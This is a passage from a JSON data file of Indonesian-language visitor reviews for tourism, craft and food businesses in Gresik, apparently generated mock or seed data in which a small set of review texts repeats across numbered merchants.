                "id": "r661",
                "merchantId": "m221",
                "userName": "Warkop_Lover_20",
                "rating": 4,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-25T14:36:35.406Z"
            },
            {
                "id": "r662",
                "merchantId": "m221",
                "userName": "Sejarah_RI_98",
                "rating": 5,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-25T14:36:35.406Z"
            },
            {
                "id": "r663",
                "merchantId": "m221",
                "userName": "Keluarga_Ceria_78",
                "rating": 5,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-27T14:36:35.406Z"
            },
            {
                "id": "r664",
                "merchantId": "m222",
                "userName": "Warkop_Lover_30",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-17T14:36:35.406Z"
            },
            {
                "id": "r665",
                "merchantId": "m222",
                "userName": "Sejarah_RI_18",
                "rating": 5,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-22T14:36:35.406Z"
            },
            {
                "id": "r666",
                "merchantId": "m222",
                "userName": "Keluarga_Ceria_60",
                "rating": 5,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-14T14:36:35.406Z"
            },
            {
                "id": "r667",
                "merchantId": "m223",
                "userName": "Neng_Siti_31",
                "rating": 4,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-18T14:36:35.406Z"
            },
            {
                "id": "r668",
                "merchantId": "m223",
                "userName": "Warkop_Lover_60",
                "rating": 5,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-18T14:36:35.406Z"
            },
            {
                "id": "r669",
                "merchantId": "m223",
                "userName": "Sejarah_RI_59",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-26T14:36:35.406Z"
            },
            {
                "id": "r670",
                "merchantId": "m224",
                "userName": "Warkop_Lover_43",
                "rating": 4,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-21T14:36:35.406Z"
            },
            {
                "id": "r671",
                "merchantId": "m224",
                "userName": "Sejarah_RI_36",
                "rating": 4,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-15T14:36:35.406Z"
            },
            {
                "id": "r672",
                "merchantId": "m224",
                "userName": "Keluarga_Ceria_13",
                "rating": 5,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-24T14:36:35.406Z"
            },
            {
                "id": "r673",
                "merchantId": "m225",
                "userName": "Warkop_Lover_19",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-16T14:36:35.406Z"
            },
            {
                "id": "r674",
                "merchantId": "m225",
                "userName": "Sejarah_RI_58",
                "rating": 4,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-16T14:36:35.406Z"
            },
            {
                "id": "r675",
                "merchantId": "m225",
                "userName": "Keluarga_Ceria_77",
                "rating": 5,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-27T14:36:35.406Z"
            },
            {
                "id": "r676",
                "merchantId": "m226",
                "userName": "Warkop_Lover_11",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-28T14:36:35.406Z"
            },
            {
                "id": "r677",
                "merchantId": "m226",
                "userName": "Sejarah_RI_76",
                "rating": 5,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-24T14:36:35.406Z"
            },
            {
                "id": "r678",
                "merchantId": "m226",
                "userName": "Keluarga_Ceria_81",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-18T14:36:35.406Z"
            },
            {
                "id": "r679",
                "merchantId": "m227",
                "userName": "Warkop_Lover_63",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-22T14:36:35.406Z"
            },
            {
                "id": "r680",
                "merchantId": "m227",
                "userName": "Sejarah_RI_44",
                "rating": 4,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-14T14:36:35.406Z"
            },
            {
                "id": "r681",
                "merchantId": "m227",
                "userName": "Keluarga_Ceria_34",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-14T14:36:35.406Z"
            },
            {
                "id": "r682",
                "merchantId": "m228",
                "userName": "Warkop_Lover_94",
                "rating": 4,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-23T14:36:35.406Z"
            },
            {
                "id": "r683",
                "merchantId": "m228",
                "userName": "Sejarah_RI_99",
                "rating": 4,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-15T14:36:35.406Z"
            },
            {
                "id": "r684",
                "merchantId": "m228",
                "userName": "Keluarga_Ceria_78",
                "rating": 5,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-26T14:36:35.406Z"
            },
            {
                "id": "r685",
                "merchantId": "m229",
                "userName": "Warkop_Lover_57",
                "rating": 4,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-19T14:36:35.406Z"
            },
            {
                "id": "r686",
                "merchantId": "m229",
                "userName": "Sejarah_RI_52",
                "rating": 5,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-19T14:36:35.406Z"
            },
            {
                "id": "r687",
                "merchantId": "m229",
                "userName": "Keluarga_Ceria_62",
                "rating": 4,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-28T14:36:35.406Z"
            },
            {
                "id": "r688",
                "merchantId": "m230",
                "userName": "Warkop_Lover_44",
                "rating": 4,
                "text": "Tempat piknik santai di sore hari sambil kulineran murah meriah bersama sahabat terdekat.",
                "timestamp": "2026-05-26T14:36:35.406Z"
            },
            {
                "id": "r689",
                "merchantId": "m230",
                "userName": "Sejarah_RI_81",
                "rating": 5,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-22T14:36:35.406Z"
            },
            {
                "id": "r690",
                "merchantId": "m230",
                "userName": "Keluarga_Ceria_32",
                "rating": 4,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-17T14:36:35.406Z"
            },
            {
                "id": "r691",
                "merchantId": "m231",
                "userName": "Warkop_Lover_72",
                "rating": 4,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-28T14:36:35.406Z"
            },
            {
                "id": "r692",
                "merchantId": "m231",
                "userName": "Sejarah_RI_65",
                "rating": 5,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-17T14:36:35.406Z"
            },
            {
                "id": "r693",
                "merchantId": "m231",
                "userName": "Keluarga_Ceria_38",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-23T14:36:35.406Z"
            },
            {
                "id": "r694",
                "merchantId": "m232",
                "userName": "Warkop_Lover_19",
                "rating": 4,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-27T14:36:35.406Z"
            },
            {
                "id": "r695",
                "merchantId": "m232",
                "userName": "Sejarah_RI_79",
                "rating": 5,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-25T14:36:35.406Z"
            },
            {
                "id": "r696",
                "merchantId": "m232",
                "userName": "Keluarga_Ceria_58",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-15T14:36:35.406Z"
            },
            {
                "id": "r697",
                "merchantId": "m233",
                "userName": "Warkop_Lover_80",
                "rating": 5,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-28T14:36:35.406Z"
            },
            {
                "id": "r698",
                "merchantId": "m233",
                "userName": "Sejarah_RI_30",
                "rating": 5,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-28T14:36:35.406Z"
            },
            {
                "id": "r699",
                "merchantId": "m233",
                "userName": "Keluarga_Ceria_23",
                "rating": 5,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-14T14:36:35.406Z"
            },
            {
                "id": "r700",
                "merchantId": "m234",
                "userName": "Neng_Siti_91",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-19T14:36:35.406Z"
            },
            {
                "id": "r701",
                "merchantId": "m234",
                "userName": "Warkop_Lover_53",
                "rating": 5,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-20T14:36:35.406Z"
            },
            {
                "id": "r702",
                "merchantId": "m234",
                "userName": "Sejarah_RI_98",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-25T14:36:35.406Z"
            },
            {
                "id": "r703",
                "merchantId": "m235",
                "userName": "Warkop_Lover_24",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-27T14:36:35.406Z"
            },
            {
                "id": "r704",
                "merchantId": "m235",
                "userName": "Sejarah_RI_36",
                "rating": 4,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-16T14:36:35.406Z"
            },
            {
                "id": "r705",
                "merchantId": "m235",
                "userName": "Keluarga_Ceria_24",
                "rating": 5,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-19T14:36:35.406Z"
            },
            {
                "id": "r706",
                "merchantId": "m236",
                "userName": "Warkop_Lover_83",
                "rating": 4,
                "text": "Informasi penjelasan pemandu lokal sangat detail dan ramah dalam menerangkan prasasti kuno.",
                "timestamp": "2026-05-27T14:36:35.406Z"
            },
            {
                "id": "r707",
                "merchantId": "m236",
                "userName": "Sejarah_RI_98",
                "rating": 4,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-14T14:36:35.406Z"
            },
            {
                "id": "r708",
                "merchantId": "m236",
                "userName": "Keluarga_Ceria_28",
                "rating": 5,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-19T14:36:35.406Z"
            },
            {
                "id": "r709",
                "merchantId": "m237",
                "userName": "Neng_Siti_94",
                "rating": 4,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-21T14:36:35.406Z"
            },
            {
                "id": "r710",
                "merchantId": "m237",
                "userName": "Warkop_Lover_29",
                "rating": 4,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-15T14:36:35.406Z"
            },
            {
                "id": "r711",
                "merchantId": "m237",
                "userName": "Sejarah_RI_30",
                "rating": 5,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-20T14:36:35.406Z"
            },
            {
                "id": "r712",
                "merchantId": "m238",
                "userName": "Warkop_Lover_54",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-23T14:36:35.406Z"
            },
            {
                "id": "r713",
                "merchantId": "m238",
                "userName": "Sejarah_RI_95",
                "rating": 5,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-22T14:36:35.406Z"
            },
            {
                "id": "r714",
                "merchantId": "m238",
                "userName": "Keluarga_Ceria_23",
                "rating": 5,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-21T14:36:35.406Z"
            },
            {
                "id": "r715",
                "merchantId": "m239",
                "userName": "Warkop_Lover_85",
                "rating": 4,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-22T14:36:35.406Z"
            },
            {
                "id": "r716",
                "merchantId": "m239",
                "userName": "Sejarah_RI_99",
                "rating": 5,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-20T14:36:35.406Z"
            },
            {
                "id": "r717",
                "merchantId": "m239",
                "userName": "Keluarga_Ceria_72",
                "rating": 5,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-17T14:36:35.406Z"
            },
            {
                "id": "r718",
                "merchantId": "m240",
                "userName": "Warkop_Lover_96",
                "rating": 4,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-26T14:36:35.406Z"
            },
            {
                "id": "r719",
                "merchantId": "m240",
                "userName": "Sejarah_RI_35",
                "rating": 5,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-25T14:36:35.406Z"
            },
            {
                "id": "r720",
                "merchantId": "m240",
                "userName": "Keluarga_Ceria_65",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-20T14:36:35.406Z"
            },
            {
                "id": "r721",
                "merchantId": "m241",
                "userName": "Warkop_Lover_35",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-17T14:36:35.406Z"
            },
            {
                "id": "r722",
                "merchantId": "m241",
                "userName": "Sejarah_RI_49",
                "rating": 5,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-21T14:36:35.406Z"
            },
            {
                "id": "r723",
                "merchantId": "m241",
                "userName": "Keluarga_Ceria_50",
                "rating": 5,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-21T14:36:35.406Z"
            },
            {
                "id": "r724",
                "merchantId": "m242",
                "userName": "Warkop_Lover_10",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-27T14:36:35.406Z"
            },
            {
                "id": "r725",
                "merchantId": "m242",
                "userName": "Sejarah_RI_48",
                "rating": 5,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-24T14:36:35.406Z"
            },
            {
                "id": "r726",
                "merchantId": "m242",
                "userName": "Keluarga_Ceria_39",
                "rating": 5,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-23T14:36:35.406Z"
            },
            {
                "id": "r727",
                "merchantId": "m243",
                "userName": "Warkop_Lover_90",
                "rating": 5,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-28T14:36:35.406Z"
            },
            {
                "id": "r728",
                "merchantId": "m243",
                "userName": "Sejarah_RI_18",
                "rating": 5,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-17T14:36:35.406Z"
            },
            {
                "id": "r729",
                "merchantId": "m243",
                "userName": "Keluarga_Ceria_44",
                "rating": 5,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-20T14:36:35.406Z"
            },
            {
                "id": "r730",
                "merchantId": "m244",
                "userName": "Warkop_Lover_89",
                "rating": 4,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-27T14:36:35.406Z"
            },
            {
                "id": "r731",
                "merchantId": "m244",
                "userName": "Sejarah_RI_49",
                "rating": 5,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-16T14:36:35.406Z"
            },
            {
                "id": "r732",
                "merchantId": "m244",
                "userName": "Keluarga_Ceria_56",
                "rating": 4,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-24T14:36:35.406Z"
            },
            {
                "id": "r733",
                "merchantId": "m245",
                "userName": "Warkop_Lover_61",
                "rating": 4,
                "text": "Toko oleh-oleh paling komplit dengan packing yang rapi. Pelayanannya ramah membantu membawakan ke mobil.",
                "timestamp": "2026-05-24T14:36:35.406Z"
            },
            {
                "id": "r734",
                "merchantId": "m245",
                "userName": "Sejarah_RI_50",
                "rating": 5,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-15T14:36:35.406Z"
            },
            {
                "id": "r735",
                "merchantId": "m245",
                "userName": "Keluarga_Ceria_78",
                "rating": 4,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-14T14:36:35.406Z"
            },
            {
                "id": "r736",
                "merchantId": "m246",
                "userName": "Warkop_Lover_16",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-15T14:36:35.406Z"
            },
            {
                "id": "r737",
                "merchantId": "m246",
                "userName": "Sejarah_RI_56",
                "rating": 4,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-21T14:36:35.406Z"
            },
            {
                "id": "r738",
                "merchantId": "m246",
                "userName": "Keluarga_Ceria_84",
                "rating": 4,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-24T14:36:35.406Z"
            },
            {
                "id": "r739",
                "merchantId": "m247",
                "userName": "Warkop_Lover_68",
                "rating": 4,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-18T14:36:35.406Z"
            },
            {
                "id": "r740",
                "merchantId": "m247",
                "userName": "Sejarah_RI_55",
                "rating": 4,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-18T14:36:35.406Z"
            },
            {
                "id": "r741",
                "merchantId": "m247",
                "userName": "Keluarga_Ceria_42",
                "rating": 4,
                "text": "Lampion kertas lukis Damar Kurung tradisional wangi lilin malam buatan seniman sangat indah.",
                "timestamp": "2026-05-26T14:36:35.406Z"
            },
            {
                "id": "r742",
                "merchantId": "m248",
                "userName": "Warkop_Lover_93",
                "rating": 5,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-17T14:36:35.406Z"
            },
            {
                "id": "r743",
                "merchantId": "m248",
                "userName": "Sejarah_RI_64",
                "rating": 4,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-26T14:36:35.406Z"
            },
            {
                "id": "r744",
                "merchantId": "m248",
                "userName": "Keluarga_Ceria_14",
                "rating": 4,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-19T14:36:35.406Z"
            },
            {
                "id": "r745",
                "merchantId": "m249",
                "userName": "Neng_Siti_73",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-18T14:36:35.406Z"
            },
            {
                "id": "r746",
                "merchantId": "m249",
                "userName": "Warkop_Lover_34",
                "rating": 4,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-19T14:36:35.406Z"
            },
            {
                "id": "r747",
                "merchantId": "m249",
                "userName": "Sejarah_RI_59",
                "rating": 4,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-20T14:36:35.406Z"
            },
            {
                "id": "r748",
                "merchantId": "m250",
                "userName": "Warkop_Lover_11",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-20T14:36:35.406Z"
            },
            {
                "id": "r749",
                "merchantId": "m250",
                "userName": "Sejarah_RI_49",
                "rating": 4,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-24T14:36:35.406Z"
            },
            {
                "id": "r750",
                "merchantId": "m250",
                "userName": "Keluarga_Ceria_73",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-24T14:36:35.406Z"
            },
            {
                "id": "r751",
                "merchantId": "m251",
                "userName": "Warkop_Lover_79",
                "rating": 4,
                "text": "Sangat ramai dikunjungi peziarah saat malam Jumat Legi. Parkir bus luar kota cukup luas.",
                "timestamp": "2026-05-22T14:36:35.406Z"
            },
            {
                "id": "r752",
                "merchantId": "m251",
                "userName": "Sejarah_RI_84",
                "rating": 4,
                "text": "Tempat ziarah wali yang sangat tenang, damai, dan penuh khidmat untuk bermunajat zikir.",
                "timestamp": "2026-05-21T14:36:35.406Z"
            },
            {
                "id": "r753",
                "merchantId": "m251",
                "userName": "Keluarga_Ceria_93",
                "rating": 4,
                "text": "Kompleks makam yang sangat rapi, bersih, dan dijaga dengan baik oleh para pengurus yayasan.",
                "timestamp": "2026-05-18T14:36:35.406Z"
            },
            {
                "id": "r754",
                "merchantId": "m252",
                "userName": "Warkop_Lover_94",
                "rating": 4,
                "text": "Cagar budaya berharga tinggi yang wajib dikunjungi seluruh generasi muda kita.",
                "timestamp": "2026-05-25T14:36:35.406Z"
            },
            {
                "id": "r755",
                "merchantId": "m252",
                "userName": "Sejarah_RI_50",
                "rating": 5,
                "text": "Situs sejarah peninggalan kerajaan Islam kuno yang menyimpan edukasi sejarah Nusantara luar biasa.",
                "timestamp": "2026-05-20T14:36:35.406Z"
            },
            {
                "id": "r756",
                "merchantId": "m252",
                "userName": "Keluarga_Ceria_46",
                "rating": 5,
                "text": "Rumah antik heritage bergaya indis eropa klasik yang masih sangat kokoh terawat dengan baik.",
                "timestamp": "2026-05-26T14:36:35.406Z"
            },
            {
                "id": "r757",
                "merchantId": "m253",
                "userName": "Warkop_Lover_25",
                "rating": 4,
                "text": "Harga pengrajin tangan pertama yang jauh lebih murah dibanding mall besar. Sangat puas belanja!",
                "timestamp": "2026-05-18T14:36:35.406Z"
            },
            {
                "id": "r758",
                "merchantId": "m253",
                "userName": "Sejarah_RI_94",
                "rating": 4,
                "text": "Pusat produsen barang suvenir kerajinan tangan khas buatan lokal dengan kualitas jahitan/anyaman sangat rapi.",
                "timestamp": "2026-05-23T14:36:35.406Z"
            },
            {
                "id": "r759",
                "merchantId": "m253",
                "userName": "Keluarga_Ceria_54",
                "rating": 4,
                "text": "Kain tenun sarung bermotif batik goyor ekspor dengan benang sutra super halus dan awet.",
                "timestamp": "2026-05-27T14:36:35.406Z"
            },
            {
                "id": "r760",
                "merchantId": "m254",
                "userName": "Warkop_Lover_62",
                "rating": 4,
                "text": "Fasilitas toilet, ruang bilas, dan mushola lengkap bersih. Liburan murah meriah yang menyenangkan.",
                "timestamp": "2026-05-19T14:36:35.406Z"
            },
            {
                "id": "r761",
                "merchantId": "m254",
                "userName": "Sejarah_RI_60",
                "rating": 5,
                "text": "Wahana waterpark terkeren di GKB! Seluncuran air spiralnya sangat memacu adrenalin seru.",
                "timestamp": "2026-05-28T14:36:35.406Z"
            },
            {
                "id": "r762",
                "merchantId": "m254",
                "userName": "Keluarga_Ceria_20",
                "rating": 5,
                "text": "Taman rekreasi keluarga yang asri dan luas dengan spot foto instagramable bergaya kastil eropa.",
                "timestamp": "2026-05-24T14:36:35.406Z"
            },
            {
                "id": "r763",
                "merchantId": "m255",
                "userName": "Warkop_Lover_17",
                "rating": 5,
                "text": "Belajar cara membuat wayang tatah kulit kerbau asli dari sang maestro dalang sangat berkesan.",
                "timestamp": "2026-05-24T14:36:35.406Z"
            },
            {
                "id": "r764",
                "merchantId": "m255",
                "userName": "Sejarah_RI_15",
                "rating": 5,
                "text": "Kesenian daerah yang unik dan kental nuansa perpaduan islam, melayu, Jawa, dan kolonial.",
                "timestamp": "2026-05-21T14:36:35.406Z"
            },
            {
                "id": "r765",
                "merchantId": "m255",
                "userName": "Keluarga_Ceria_86",
                "rating": 4,
                "text": "Sanggar pertunjukan tari tradisional yang melestarikan seni pusaka tari silat daerah dengan lincah.",
                "timestamp": "2026-05-16T14:36:35.406Z"
            },
            {
                "id": "r766",
                "merchantId": "m256",
                "userName": "Warkop_Lover_23",
                "rating": 4,
                "text": "Perpustakaan sejuk ber-AC lengkap dengan pojok baca anak interaktif yang nyaman sekali.",
                "timestamp": "2026-05-21T14:36:35.406Z"
            },
            {
                "id": "r767",
                "merchantId": "m256",
                "userName": "Sejarah_RI_81",
                "rating": 4,
                "text": "Museum edukasi mini terbaik di Gresik dengan koleksi keramik dinasti dan manuskrip sejarah rapi.",
                "timestamp": "2026-05-16T14:36:35.406Z"
            },
            {
                "id": "r768",
                "merchantId": "m256",
                "userName": "Keluarga_Ceria_70",
                "rating": 5,
                "text": "Praktik menanam langsung bibit bakau mangrove di lumpur pantai mengajari anak cinta ekologi alam.",
                "timestamp": "2026-05-17T14:36:35.406Z"
            },
            {
                "id": "r769",
                "merchantId": "m257",
                "userName": "Warkop_Lover_93",
                "rating": 4,
                "text": "Enak tenan! Rekomendasi sarapan pagi yang mengenyangkan di daerah sini.",
                "timestamp": "2026-05-23T14:36:35.406Z"
            },
            {
                "id": "r770",
                "merchantId": "m257",
                "userName": "Sejarah_RI_72",
                "rating": 4,
                "text": "Rasanya sangat khas dan otentik sekali! Porsinya pas dan dagingnya empuk. Sangat direkomendasikan.",
                "timestamp": "2026-05-19T14:36:35.406Z"
            },
            {
                "id": "r771",
                "merchantId": "m257",
                "userName": "Keluarga_Ceria_91",
                "rating": 4,
                "text": "Bumbunya meresap sampai ke dalam. Pelayanannya cepat walau antrean cukup ramai saat akhir pekan.",
                "timestamp": "2026-05-25T14:36:35.406Z"
            },
            {
                "id": "r772",
                "merchantId": "m258",
                "userName": "Warkop_Lover_92",
                "rating": 4,
                "text": "Akses jalan menuju lokasi sudah cukup baik dan tertata rapi oleh pokdarwis setempat.",
                "timestamp": "2026-05-15T14:36:35.406Z"
            },
            {
                "id": "r773",
                "merchantId": "m258",
                "userName": "Sejarah_RI_97",
                "rating": 5,
                "text": "Pemandangannya sangat asri, menyejukkan mata dan pikiran setelah penat bekerja seminggu penuh.",
                "timestamp": "2026-05-21T14:36:35.406Z"
            },
            {
                "id": "r774",
                "merchantId": "m258",
                "userName": "Keluarga_Ceria_90",
                "rating": 4,
                "text": "Spot foto tebing batunya unik sekali. Tiket masuk sangat terjangkau bagi kantong pelajar.",
                "timestamp": "2026-05-25T14:36:35.406Z"
            },
            {
